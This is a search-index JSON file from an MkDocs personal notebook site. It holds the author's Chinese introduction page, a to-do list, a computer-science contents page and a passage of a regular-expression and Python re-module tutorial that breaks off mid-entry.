{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"o(\u3003'\u25bd'\u3003)o Hi! \u00b6 site.info \u8fd9\u91cc\u662f\u9e64\u7fd4\u4e07\u91cc\uff08TonyCrane\uff09\u7684\u4e2a\u4eba\u7b14\u8bb0\u672c\u54e6 \u4e3b\u8981\u662f\u8ba1\u7b97\u673a\u76f8\u5173\u7684\u5185\u5bb9\u3001CTF \u77e5\u8bc6\u5e93\uff0c\u4ee5\u53ca\u5f52\u6863\u4e86\u4e00\u4e9b CTF \u6bd4\u8d5b\u7684 writeup\uff0c\u8fd8\u6709\u4e00\u4e9b\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f \u5982\u679c\u53d1\u73b0\u4e86\u6709\u5185\u5bb9\u9519\u8bef\u53ef\u4ee5\u901a\u8fc7\u6587\u672b\u8bc4\u8bba\u544a\u8bc9\u6211\u5417qwq \u5927\u6982\u662f\u968f\u65f6\u66f4\u65b0\uff0c\u968f\u65f6\u5495\u5495\u5495 about(site.author) 18 \u5c81\uff0c\u4e8b\u6d59\u6c5f\u5927\u5b66\u5927\u4e00\u65b0\u751f\uff0c\u4e8b\u54d4\u54e9\u54d4\u54e9 up \u4e3b @\u9e64\u7fd4\u4e07\u91cc \uff0c\u4e8b AAA \u6218\u961f misc \u624b @TonyCrane \u4e3b\u9875\uff1a https://tonycrane.cc/ \u535a\u5ba2\uff1a https://blog.tonycrane.cc/ GitHub\uff1a https://github.com/TonyCrane/ script.py if visitor . name == 'TonyCrane' : print ( f \"\u770b\u4ec0\u4e48\u770b\uff0c\u5feb\u53bb\u5b66\u4e60/\u505a\u89c6\u9891/\u5199\u7b14\u8bb0/\u6253CTF/ { '/' . join ( tasks ) } \\n \" ) logging . warning ( \"\u522b\u6478\u4e86\" ) else : print ( \"\u5e0c\u671b\u8fd9\u4e2a\u5c0f\u7834\u7ad9\u70b9\u80fd\u5bf9\u4f60\u6709\u6240\u5e2e\u52a9\u30fd(*\u00b4\u2200\uff40)\u516b(\u00b4\u2200\uff40*)\u30ce \\n \" ) thanks_list . append ( visitor . name )","title":"o(\u3003'\u25bd'\u3003)o Hi!"},{"location":"#oo-hi","text":"site.info \u8fd9\u91cc\u662f\u9e64\u7fd4\u4e07\u91cc\uff08TonyCrane\uff09\u7684\u4e2a\u4eba\u7b14\u8bb0\u672c\u54e6 \u4e3b\u8981\u662f\u8ba1\u7b97\u673a\u76f8\u5173\u7684\u5185\u5bb9\u3001CTF \u77e5\u8bc6\u5e93\uff0c\u4ee5\u53ca\u5f52\u6863\u4e86\u4e00\u4e9b CTF \u6bd4\u8d5b\u7684 writeup\uff0c\u8fd8\u6709\u4e00\u4e9b\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f \u5982\u679c\u53d1\u73b0\u4e86\u6709\u5185\u5bb9\u9519\u8bef\u53ef\u4ee5\u901a\u8fc7\u6587\u672b\u8bc4\u8bba\u544a\u8bc9\u6211\u5417qwq \u5927\u6982\u662f\u968f\u65f6\u66f4\u65b0\uff0c\u968f\u65f6\u5495\u5495\u5495 about(site.author) 18 \u5c81\uff0c\u4e8b\u6d59\u6c5f\u5927\u5b66\u5927\u4e00\u65b0\u751f\uff0c\u4e8b\u54d4\u54e9\u54d4\u54e9 up \u4e3b @\u9e64\u7fd4\u4e07\u91cc \uff0c\u4e8b AAA \u6218\u961f misc \u624b @TonyCrane \u4e3b\u9875\uff1a https://tonycrane.cc/ \u535a\u5ba2\uff1a https://blog.tonycrane.cc/ GitHub\uff1a https://github.com/TonyCrane/ script.py if visitor . name == 'TonyCrane' : print ( f \"\u770b\u4ec0\u4e48\u770b\uff0c\u5feb\u53bb\u5b66\u4e60/\u505a\u89c6\u9891/\u5199\u7b14\u8bb0/\u6253CTF/ { '/' . join ( tasks ) } \\n \" ) logging . warning ( \"\u522b\u6478\u4e86\" ) else : print ( \"\u5e0c\u671b\u8fd9\u4e2a\u5c0f\u7834\u7ad9\u70b9\u80fd\u5bf9\u4f60\u6709\u6240\u5e2e\u52a9\u30fd(*\u00b4\u2200\uff40)\u516b(\u00b4\u2200\uff40*)\u30ce \\n \" ) thanks_list . append ( visitor . name )","title":"o(\u3003'\u25bd'\u3003)o Hi!"},{"location":"todo/","text":"\u4ee3\u529e\u4e8b\u9879 \u00b6 \u5efa\u7ad9\u7c7b \u00b6 nav \u680f\u989c\u8272 \u6697\u8272\u4e3b\u9898 \u5b57\u4f53\u5927\u5c0f h1 h2 \u7684 font-weight\uff08\u8c8c\u4f3c\u624b\u673a\u4e0a\u6ca1\u95ee\u9898\uff1f\uff09 \u884c\u8ddd \u4fee\u516c\u5f0f\u6e32\u67d3 \u4e3b\u9875\u3001\u5173\u4e8e \u9875\u811a\u7248\u6743\u4fe1\u606f \u9875\u811a\u8054\u7cfb\u65b9\u5f0f \u94fe\u63a5 GitHub \u4ed3\u5e93 tasklist \u6837\u5f0f \u642c\u8fd0\u535a\u5ba2 \u4e8c\u7ef4\u7801 Haskell hackergame writeup \u642c\u51e0\u4e2a\u6bd4\u8d5b\u7684 writeup \u5efa\u7acb writeup \u5206\u533a \u5efa\u7acb \u8ba1\u7b97\u673a \u5206\u533a \u90e8\u7f72\u5230\u4e91\u670d\u52a1\u5668 \u5de6\u4e0a\u89d2 logo \u5b8c\u5584 css \u7ed1\u5b9a\u57df\u540d \u516c\u5f00 repo \u663e\u793a\u6700\u540e\u4fee\u6539\u65f6\u95f4 GitHub repo \u6dfb\u52a0 README \u624b\u673a\u7aef\u989c\u8272\u95ee\u9898 \u4ee3\u7801\u5757\u80cc\u666f\u548c\u535a\u5ba2\u540c\u6b65 \u4ee3\u7801\u914d\u8272\u65b9\u6848\u548c\u535a\u5ba2\u540c\u6b65 \u81ea\u52a8\u6697\u8272 \u6dfb\u52a0 icons \u548c emojis \u53f3\u4fa7 toc \u6df1\u5ea6\u8c03\u6574 \u5de6\u4fa7 nav \u6df1\u5ea6\u8c03\u6574 \u4e3a\u6bcf\u4e2a\u5206\u533a\u6dfb\u52a0 index cs cs/pl ctf writeups \u8bbf\u95ee\u7edf\u8ba1 Google Analytics \u767e\u5ea6\u7edf\u8ba1 \u642c\u4e00\u4e9b notion \u4e0a\u7684 misc kb \u628a yml \u5f04\u5e72\u51c0\u4e00\u70b9 \u5199\u4e00\u4e0b mkdocs \u7528\u6cd5 \u6807\u9898\u524d\u7f00\u6570\u5b57 \u642d\u4e2a\u7f51\u76d8 \u6587\u4ef6\u94fe\u63a5 \u7b14\u8bb0\u7c7b \u00b6 x86 \u6c47\u7f16\u8bed\u8a00 \u8865\u5145 186\uff5e386 \u6307\u4ee4 \u8865\u5145 fl \u5f71\u54cd RISC-V \u6c47\u7f16\u8bed\u8a00 \u8865\u5145\u6269\u5c55\u6307\u4ee4\u96c6\u6307\u4ee4 \u7cfb\u7edf\u4e00\u76f8\u5173 \u7406\u8bba\u8bfe lab CTF blockchain Python \u76f8\u5173 Lecture \u6587\u5b57\u7248 NumPy PIL matplotlib HPC SIMD \u5b66\u671f\u603b\u7ed3\u535a\u5ba2 log4j \u6f0f\u6d1e\u590d\u73b0\u5b58\u4e2a\u6863","title":"\u4ee3\u529e\u4e8b\u9879"},{"location":"todo/#_1","text":"","title":"\u4ee3\u529e\u4e8b\u9879"},{"location":"todo/#_2","text":"nav \u680f\u989c\u8272 \u6697\u8272\u4e3b\u9898 \u5b57\u4f53\u5927\u5c0f h1 h2 \u7684 font-weight\uff08\u8c8c\u4f3c\u624b\u673a\u4e0a\u6ca1\u95ee\u9898\uff1f\uff09 \u884c\u8ddd \u4fee\u516c\u5f0f\u6e32\u67d3 \u4e3b\u9875\u3001\u5173\u4e8e \u9875\u811a\u7248\u6743\u4fe1\u606f \u9875\u811a\u8054\u7cfb\u65b9\u5f0f \u94fe\u63a5 GitHub \u4ed3\u5e93 tasklist \u6837\u5f0f \u642c\u8fd0\u535a\u5ba2 \u4e8c\u7ef4\u7801 Haskell hackergame writeup \u642c\u51e0\u4e2a\u6bd4\u8d5b\u7684 writeup \u5efa\u7acb writeup \u5206\u533a \u5efa\u7acb \u8ba1\u7b97\u673a \u5206\u533a \u90e8\u7f72\u5230\u4e91\u670d\u52a1\u5668 \u5de6\u4e0a\u89d2 logo \u5b8c\u5584 css \u7ed1\u5b9a\u57df\u540d \u516c\u5f00 repo \u663e\u793a\u6700\u540e\u4fee\u6539\u65f6\u95f4 GitHub repo \u6dfb\u52a0 README \u624b\u673a\u7aef\u989c\u8272\u95ee\u9898 \u4ee3\u7801\u5757\u80cc\u666f\u548c\u535a\u5ba2\u540c\u6b65 \u4ee3\u7801\u914d\u8272\u65b9\u6848\u548c\u535a\u5ba2\u540c\u6b65 \u81ea\u52a8\u6697\u8272 \u6dfb\u52a0 icons \u548c emojis \u53f3\u4fa7 toc \u6df1\u5ea6\u8c03\u6574 \u5de6\u4fa7 nav \u6df1\u5ea6\u8c03\u6574 \u4e3a\u6bcf\u4e2a\u5206\u533a\u6dfb\u52a0 index cs cs/pl ctf writeups \u8bbf\u95ee\u7edf\u8ba1 Google Analytics \u767e\u5ea6\u7edf\u8ba1 \u642c\u4e00\u4e9b notion \u4e0a\u7684 misc kb \u628a yml \u5f04\u5e72\u51c0\u4e00\u70b9 \u5199\u4e00\u4e0b mkdocs \u7528\u6cd5 \u6807\u9898\u524d\u7f00\u6570\u5b57 \u642d\u4e2a\u7f51\u76d8 \u6587\u4ef6\u94fe\u63a5","title":"\u5efa\u7ad9\u7c7b"},{"location":"todo/#_3","text":"x86 \u6c47\u7f16\u8bed\u8a00 \u8865\u5145 186\uff5e386 \u6307\u4ee4 \u8865\u5145 fl \u5f71\u54cd RISC-V \u6c47\u7f16\u8bed\u8a00 \u8865\u5145\u6269\u5c55\u6307\u4ee4\u96c6\u6307\u4ee4 \u7cfb\u7edf\u4e00\u76f8\u5173 \u7406\u8bba\u8bfe lab CTF blockchain Python \u76f8\u5173 Lecture \u6587\u5b57\u7248 NumPy PIL matplotlib HPC SIMD \u5b66\u671f\u603b\u7ed3\u535a\u5ba2 log4j \u6f0f\u6d1e\u590d\u73b0\u5b58\u4e2a\u6863","title":"\u7b14\u8bb0\u7c7b"},{"location":"cs/","text":"Computer Science \u00b6 Abstract \u8fd9\u91cc\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u76f8\u5173\u5185\u5bb9\u7684\u7b14\u8bb0 \u6709\u7684\u662f\u81ea\u5b66\u7684\u7b14\u8bb0\uff0c\u6709\u7684\u662f\u8bfe\u7a0b\u7b14\u8bb0 Table of Contents \u00b6 Programming Language \u7f16\u7a0b\u8bed\u8a00 C/C++ Haskell x86 Assembly RISC-V ISA Computer System \u8ba1\u7b97\u673a\u7cfb\u7edf Computer System I \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 Web \u76f8\u5173 SVG log4j \u6f0f\u6d1e\u590d\u73b0 RegEx \u6b63\u5219\u8868\u8fbe\u5f0f Unicode \u7edf\u4e00\u7801","title":"Computer Science"},{"location":"cs/#computer-science","text":"Abstract \u8fd9\u91cc\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u76f8\u5173\u5185\u5bb9\u7684\u7b14\u8bb0 \u6709\u7684\u662f\u81ea\u5b66\u7684\u7b14\u8bb0\uff0c\u6709\u7684\u662f\u8bfe\u7a0b\u7b14\u8bb0","title":"Computer Science"},{"location":"cs/#table-of-contents","text":"Programming Language \u7f16\u7a0b\u8bed\u8a00 C/C++ Haskell x86 Assembly RISC-V ISA Computer System \u8ba1\u7b97\u673a\u7cfb\u7edf Computer System I \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 Web \u76f8\u5173 SVG log4j \u6f0f\u6d1e\u590d\u73b0 RegEx \u6b63\u5219\u8868\u8fbe\u5f0f Unicode \u7edf\u4e00\u7801","title":"Table of Contents"},{"location":"cs/regex/","text":"\u6b63\u5219\u8868\u8fbe\u5f0f \u00b6 \u6b63\u5219\u8868\u8fbe\u5f0f\uff08Regular Expression\uff09\u4f7f\u7528\u5355\u4e2a\u5b57\u7b26\u4e32\u6765\u63cf\u8ff0\u3001\u5339\u914d\u4e00\u7cfb\u5217\u5339\u914d\u67d0\u4e2a\u53e5\u6cd5\u89c4\u5219\u7684\u5b57\u7b26\u4e32\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 Abstract \u6b63\u5219\u8868\u8fbe\u5f0f\u7528\u9014\u5e7f\u6cdb\uff0c\u800c\u4e14\u529f\u80fd\u5f3a\u5927\u53c8\u597d\u7528\u3002\u53ef\u4ee5\u8bf4\u65e2\u7b80\u5355\u53c8\u7e41\u7410\uff0c\u4f46\u662f\u7528\u8d77\u6765\u5f88\u723d \u4e00\u4e9b\u5de5\u5177\uff1a RegExr \u6b63\u5219\u5728\u7ebf\u6d4b\u8bd5\u5de5\u5177 Regulex \u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u89c6\u5316 HackerRank regex \u4e60\u9898\u96c6 \u8bed\u6cd5 \u00b6 \u666e\u901a\u5b57\u7b26 \u00b6 \u6240\u6709\u4e0d\u662f\u5143\u5b57\u7b26\u7684\u5b57\u7b26\u90fd\u53ef\u4ee5\u76f4\u63a5\u5199\u51fa\u6765\u7528\u6765\u5339\u914d\uff0c\u6bd4\u5982\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7b26\u53f7\u7b49 \u6709\u8bed\u6cd5\u610f\u4e49\u7684\u5b57\u7b26\u9700\u8981\u4f7f\u7528 \u8f6c\u4e49\uff0c\u6bd4\u5982 \\( \\) \\[ \\] \\. \u5206\u522b\u5339\u914d ()[]. \u8fd9\u4e94\u4e2a\u5b57\u7b26 \u8bed\u6cd5 \u63cf\u8ff0 [...] \u5339\u914d\u4efb\u610f\u5728 ... \u4e2d\u7684\u5b57\u7b26\uff0c\u5982 [ABC] \u5339\u914d\u6240\u6709 A B C \u5b57\u7b26 [^...] \u5339\u914d\u4efb\u610f\u4e0d\u5728 ... \u4e2d\u7684\u5b57\u7b26\uff0c\u5982 [^ABC] \u5339\u914d\u9664\u4e86 A B C \u5916\u7684\u6240\u6709\u5355\u4e2a\u5b57\u7b26 [x-y] \u6309\u7167\u987a\u5e8f\u5339\u914d\u4ece x \u5230 y \u5230\u6240\u6709\u5b57\u7b26\uff0c\u5982 [a-z] \u5339\u914d\u6240\u6709\u5c0f\u5199\u5b57\u6bcd\uff0c[A-E] \u5339\u914d A \u5230 E \u8fd9\u4e94\u4e2a\u5b57\u7b26\uff5c . \u5339\u914d\u4efb\u610f\u9664\u4e86\u6362\u884c\u7b26\u4ee5\u5916\u7684\u5b57\u7b26 \\w \u5339\u914d\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\uff0c\u76f8\u5f53\u4e8e [a-zA-Z0-9_] x|y \u5339\u914d x \u6216 y \uff0c\u4f18\u5148\u7ea7\u6700\u4f4e\uff0c\u5982 a|bcd \u5339\u914d a \u6216 bcd \u975e\u6253\u5370\u5b57\u7b26 \u00b6 \u8bed\u6cd5 \u63cf\u8ff0 \\cx \u5339\u914d\u7531 x \u6307\u660e\u7684\u63a7\u5236\u5b57\u7b26\uff0cx \u5fc5\u987b\u5c5e\u4e8e [a-zA-Z]\uff0c\u5426\u5219 \\c \u76f4\u63a5\u89c6\u4e3a c\uff0c\u5982 \\cM \u5339\u914d Ctrl-M \u5373\u56de\u8f66\u7b26 \\f \u5339\u914d\u4e00\u4e2a\u6362\u9875\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0c \\cL \\n \u5339\u914d\u4e00\u4e2a\u6362\u884c\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0a \\cJ \\r \u5339\u914d\u4e00\u4e2a\u56de\u8f66\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0d \\cM \\t \u5339\u914d\u4e00\u4e2a\u5236\u8868\u7b26\uff0c\u76f8\u5f53\u4e8e \\x09 \\cI \\v \u5339\u914d\u4e00\u4e2a\u5782\u76f4\u5236\u8868\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0b \\cK \\s \u5339\u914d\u4efb\u4f55\u7a7a\u767d\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e [ \\f\\n\\r\\t\\v]\uff0cunicode \u4e0b\u4e5f\u4f1a\u5339\u914d\u5168\u89d2\u7a7a\u683c\u7b26 \\S \u5339\u914d\u4efb\u4f55\u975e\u7a7a\u767d\u7b26\uff0c\u76f8\u5f53\u4e8e [^ \\f\\n\\r\\t\\v] \u9650\u5b9a\u7b26 \u00b6 \u7528\u6765\u6307\u5b9a\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u51fa\u73b0\u4e86\u591a\u5c11\u6b21 \u8bed\u6cd5 \u63cf\u8ff0 {n} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u51c6\u786e\u7684 n \u6b21\uff0c\u5982 o{2} \u5339\u914d\u4e24\u4e2a\u8fde\u7eed\u7684 o {n,} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u81f3\u5c11 n \u6b21\uff0c\u5982 o{2,} \u53ef\u4ee5\u5339\u914d goooood \u4e2d\u7684\u6240\u6709 o\uff0c\u4f46\u4e0d\u5339\u914d god \u4e2d\u7684 o {n,m} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u81f3\u5c11 n \u6b21\uff0c\u81f3\u591a m \u6b21 * \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d 0 \u6b21\u6216\u591a\u6b21\uff0c\u76f8\u5f53\u4e8e {0,} + \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d 1 \u6b21\u6216\u591a\u6b21\uff0c\u76f8\u5f53\u4e8e {1,} ? \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u53ef\u6709\u53ef\u65e0\uff08\u5339\u914d 0 \u6b21\u6216 1 \u6b21\uff09\uff0c\u76f8\u5f53\u4e8e {0,1} \u8d2a\u5a6a \u00b6 * \u548c + \u7684\u5339\u914d\u90fd\u662f\u8d2a\u5a6a\u7684\uff0c\u5373\u5c3d\u53ef\u80fd\u5339\u914d\u66f4\u591a\u7684\u5b57\u7b26\uff0c\u800c\u5728\u5b83\u4eec\u540e\u9762\u52a0\u4e0a ? \u5c31\u53ef\u4ee5\u975e\u8d2a\u5a6a\uff08\u5373\u6700\u5c0f\u5339\u914d\uff09 <.*> \u4f1a\u5339\u914d\u6574\u4e2a <h1>header</h1> \u5b57\u7b26\u4e32 <.*?> \u53ea\u4f1a\u5339\u914d\u5176\u4e2d\u7684 <h1> \u548c </h1> \u5b9a\u4f4d\u7b26 \u00b6 \u53ea\u5339\u914d\u4f4d\u7f6e\uff0c\u6ca1\u6709\u5b57\u7b26\u4e0e\u4e4b\u5bf9\u5e94 \u8bed\u6cd5 \u63cf\u8ff0 ^ \u5339\u914d\u5b57\u7b26\u4e32\u5f00\u5934\uff0c\u5982\u679c\u662f\u591a\u884c\u6a21\u5f0f\uff0c\u5219\u65b0\u7684\u4e00\u884c\u4e5f\u7b97\u65b0\u7684\u5b57\u7b26\u4e32 $ \u5339\u914d\u5b57\u7b26\u4e32\u7ed3\u5c3e\uff0c\u591a\u884c\u6a21\u5f0f\u540c\u7406\u770b\u6210\u591a\u4e2a\u5b57\u7b26\u4e32 \\b \u5339\u914d\u5355\u8bcd\u8fb9\u754c\uff0c\u5373\u5b57\u7b26\u4e0e\u7a7a\u683c\u4e2d\u95f4\u7684\u4f4d\u7f6e \\B \u5339\u914d\u975e\u5355\u8bcd\u8fb9\u754c \u5b9a\u4f4d\u7b26\u53ea\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u4e0d\u80fd\u9644\u52a0\u9650\u5236\u7b26\u6307\u5b9a\u4e2a\u6570 \u5206\u7ec4 \u00b6 \u7528 () \u53ef\u4ee5\u6307\u5b9a\u5339\u914d\u4e00\u4e2a\u7ec4\uff0c\u4f7f\u7528 () \u53ef\u4ee5\u6307\u5b9a\u4e0d\u540c\u9009\u9879\uff0c\u6bcf\u4e00\u9879\u95f4\u7528 | \u5206\u9694 \u540c\u65f6 () \u4e5f\u662f\u6355\u83b7\u5206\u7ec4\uff0c\u5373\u62ec\u53f7\u5185\u5339\u914d\u7684\u5185\u5bb9\u4f1a\u88ab\u7f13\u5b58\uff0c\u5982\u679c\u8981\u907f\u514d\u8fd9\u79cd\uff0c\u9700\u8981\u4f7f\u7528 (?:) \u975e\u6355\u83b7\u5143\u6765\u8fdb\u884c\u5339\u914d \u53cd\u5411\u5f15\u7528 \u00b6 \u88ab\u7f13\u5b58\u7684\u6355\u83b7\u5206\u7ec4\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 \\n \u518d\u6b21\u5f15\u7528\uff0c\u5176\u4e2d n \u662f 1 \u5230 2 \u4f4d\u7684\u5341\u8fdb\u5236\u6570 \u6355\u83b7\u5206\u7ec4\u7684\u7f16\u53f7\u4ece 1 \u5f00\u59cb\uff0c\u6700\u591a 99 \u4e2a\uff0c\\1 \u5373\u8868\u793a\u548c\u7b2c\u4e00\u4e2a\u5706\u62ec\u53f7\u4e2d\u5339\u914d\u7684\u7ed3\u679c\u76f8\u540c\u7684\u90e8\u5206 \u5982 (abc|def)\\1 \u5339\u914d abcabc\u3001defdef \u4f46\u4e0d\u5339\u914d abcdef\u3001defabc \u5148\u884c\u65ad\u8a00\u548c\u540e\u884c\u65ad\u8a00 \u00b6 \u6b63\u5219\u8868\u8fbe\u5f0f\u6709\u5148\u884c\u65ad\u8a00\uff08lookahead\uff09\u548c\u540e\u884c\u65ad\u8a00\uff08lookbehind\uff09\uff0c\u5206\u4e3a\u56db\u79cd\u5f62\u5f0f\uff1a \u8bed\u6cd5 \u540d\u79f0 (?=pattern) \u96f6\u5bbd\u6b63\u5411\u5148\u884c\u65ad\u8a00 zero-width positive lookahead assertion (?!pattern) \u96f6\u5bbd\u8d1f\u5411\u5148\u884c\u65ad\u8a00 zero-width negative lookahead assertion (?<=pattern) \u96f6\u5bbd\u6b63\u5411\u540e\u884c\u65ad\u8a00 zero-width positive lookbehind assertion (?<!pattern) \u96f6\u5bbd\u8d1f\u5411\u540e\u884c\u65ad\u8a00 zero-width negative lookbehind assertion \u548c\u5b9a\u4f4d\u7b26\u7c7b\u4f3c\uff0c\u5b83\u53ea\u5339\u914d\u4f4d\u7f6e\uff0c\u4e0d\u5339\u914d\u5185\u5bb9\uff0c\u6240\u4ee5\u53eb\u505a\u96f6\u5bbd\uff08zero-width\uff09\uff0c\u8fd9\u4e9b\u4f4d\u7f6e\u7684\u89c4\u5219\u662f\uff1a (?=pattern)\uff1a\u5339\u914d\u540e\u9762\u53ef\u4ee5\u5339\u914d pattern \u7684\u4f4d\u7f6e (?!pattern)\uff1a\u5339\u914d\u540e\u9762\u65e0\u6cd5\u5339\u914d pattern \u7684\u4f4d\u7f6e (?<=pattern) \uff1a\u5339\u914d\u524d\u9762\u53ef\u4ee5\u5339\u914d pattern \u7684\u4f4d\u7f6e (?<!pattern)\uff1a\u5339\u914d\u524d\u9762\u65e0\u6cd5\u5339\u914d pattern \u7684\u4f4d\u7f6e \u4f8b\u5b50 \u5176\u4e2d\u540e\u884c\u65ad\u8a00\u6709\u4e9b\u8bed\u8a00\u4e0d\u652f\u6301\uff08python re \u652f\u6301\uff09 \u4fee\u9970\u7b26 \u00b6 \u4fee\u9970\u7b26\u4e0d\u5c5e\u4e8e\u8868\u8fbe\u5f0f\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u6307\u5b9a\u4e86\u5339\u914d\u7684\u89c4\u5219\uff0cjs \u4e2d\u7684\u6b63\u5219\u5199\u6cd5\u4e3a /pattern/flags \u5176\u4e2d flags \u5c31\u662f\u4fee\u9970\u7b26 \u4fee\u9970\u7b26 \u540d\u79f0 \u542b\u4e49 i ignore \u5ffd\u7565\u5927\u5c0f\u5199 g global \u5168\u5c40\u5339\u914d\uff0c\u67e5\u627e\u6240\u6709\u5339\u914d\u9879 m multi-line \u591a\u884c\u5339\u914d\uff0c\u4f7f ^$ \u5339\u914d\u6bcf\u884c\u7684\u5f00\u5934\u548c\u7ed3\u5c3e s single-line \u5355\u884c\u5339\u914d\uff0c\u53ea\u89c6\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c. \u4e5f\u53ef\u4ee5\u5339\u914d\u6362\u884c\u7b26 \u4e0d\u540c\u8bed\u8a00\u4e2d\u5199\u6cd5\u548c\u79cd\u7c7b\u4e0d\u540c \u4f18\u5148\u7ea7 \u00b6 \u6b63\u5219\u8868\u8fbe\u5f0f\u4e5f\u6709\u4f18\u5148\u7ea7\uff0c\u540c\u4e00\u4f18\u5148\u7ea7\u5219\u4ece\u5de6\u5411\u53f3\u8fd0\u7b97\uff0c\u4e0d\u540c\u4f18\u5148\u7ea7\u5219\u4ece\u9ad8\u5230\u4f4e\u3002\u4ece\u9ad8\u5230\u4f4e\uff1a \u8f6c\u4e49\u7b26 \\ \u62ec\u53f7\u7b26 (...) (?:...) (?=...) (?!...) (?<=...) (?<!...) [...] [^...] \u9650\u5b9a\u7b26 * + ? {n} {n,} {n,m} \u5b9a\u4f4d\u7b26 ^ $ \u5b57\u7b26 \u6216 | Python re \u6a21\u5757 \u00b6 python \u7684 re \u6a21\u5757\u63d0\u4f9b\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u76f8\u5173\u65b9\u6cd5\uff1a re.match(pattern, string, flags=0)\uff1a\u4f7f\u7528 pattern \u4ece\u5934 \u5339\u914d string\uff0cflags \u4e3a\u4fee\u9970\u7b26\u3002 \u5339\u914d\u5931\u8d25\u8fd4\u56de None\uff0c\u5339\u914d\u6210\u529f\u8fd4\u56de\u4e00\u4e2a re.Match re.search(pattern, string, flags=0)\uff1a\u4f7f\u7528 pattern \u626b\u63cf\u6574\u4e2a string\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u7684 re.Match re.sub(pattern, repl, string, count=0, flags=0)\uff1a pattern\uff1a\u8981\u88ab\u66ff\u6362\u90e8\u5206\u7684\u6b63\u5219\u8868\u8fbe\u5f0f repl\uff1a\u66ff\u6362\u7684\u5b57\u7b26\u4e32\uff0c\u6216\u8005\u66ff\u6362\u7528\u7684\u51fd\u6570 \u662f\u51fd\u6570\u65f6\u63a5\u53d7\u4e00\u4e2a re.Match\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32 string\uff1a\u539f\u5b57\u7b26\u4e32 count\uff1a\u66ff\u6362\u7684\u6700\u5927\u6b21\u6570\uff0c\u662f 0 \u65f6\u8868\u793a\u66ff\u6362\u5168\u90e8 flags\uff1a\u4fee\u9970\u7b26 re.compile(pattern, flags=0)\uff1a\u7f16\u8bd1\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8fd4\u56de\u4e00\u4e2a re.Pattern re.findall(pattern, string, flags=0)\uff1a\u5728 string \u4e2d\u67e5\u627e\u6240\u6709\u5339\u914d pattern \u7684\u7ed3\u679c\uff0c\u8fd4\u56de\u5217\u8868 re.finditer(pattern, string, flags=0)\uff1a\u5728 string \u4e2d\u67e5\u627e\u6240\u6709\u5339\u914d pattern \u7684\u90e8\u5206\uff0c\u8fd4\u56de\u8fed\u4ee3\u5668 re.split(pattern, string, maxsplit=0, flags=0)\uff1a pattern\uff1a\u8981\u4fdd\u7559\u90e8\u5206\u7684\u6b63\u5219\u8868\u8fbe\u5f0f string\uff1a\u539f\u5b57\u7b26\u4e32 maxsplit\uff1a\u5206\u9694\u6b21\u6570\uff0c\u662f 0 \u662f\u5168\u90e8\u5206\u9694 flags\uff1a\u4fee\u9970\u7b26 \u8fd4\u56de\u4e00\u4e2a\u5206\u5272\u540e\u7684\u5217\u8868 re.escape(pattern)\uff1a\u8f6c\u4e49 pattern \u4e2d\u7684\u7279\u6b8a\u5b57\u7b26 re.Pattern \u00b6 \u7528\u6cd5\u7c7b\u4f3c\u76f4\u63a5\u4f7f\u7528 re\uff0c\u53ea\u662f\u8fdb\u884c\u4e86\u9884\u7f16\u8bd1\uff0c\u5e76\u4e14\u56fa\u5b9a\u4e86 pattern \u548c flags Pattern.search(string[, pos[, endpos]]) Pattern.match(string[, pos[, endpos]]) Pattern.fullmatch(string[, pos[, endpos]]) Pattern.split(string, maxsplit=0) Pattern.findall(string[, pos[, endpos]]) Pattern.finditer(string[, pos[, endpos]]) Pattern.sub(repl, string, count=0) Pattern.pattern\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f Pattern.flags\uff1a\u4fee\u9970\u7b26 Pattern.groups\uff1aint \u503c\uff0cpattern \u4e2d\u6355\u83b7\u7ec4\u7684\u4e2a\u6570 Pattern.groupindex\uff1a\u4e00\u4e2a\u5b57\u5178\uff0c\u5982\u679c pattern \u4e2d\u5305\u542b (?P<name>...) \u5219\u5305\u542b\u4e00\u4e2a\u4ece name \u6620\u5c04\u5230\u6355\u83b7\u7ec4\u7f16\u53f7\u7684\u952e\u503c\u5bf9 re.Match \u00b6 re.Match \u662f match \u548c search \u5728\u6210\u529f\u5339\u914d\u65f6\u8fd4\u56de\u7684\u7c7b\u578b Match.group([group])\uff1a\u8fd4\u56de\u5b57\u7b26\u4e32 group() \u6216 group(0) \u8fd4\u56de\u5339\u914d\u7684\u5b8c\u6574\u5b57\u7b26\u4e32 group(i) \u8fd4\u56de\u7b2c i \u4e2a\u6355\u83b7\u7ec4 Match.start([group])\uff1aMatch.group([group]) 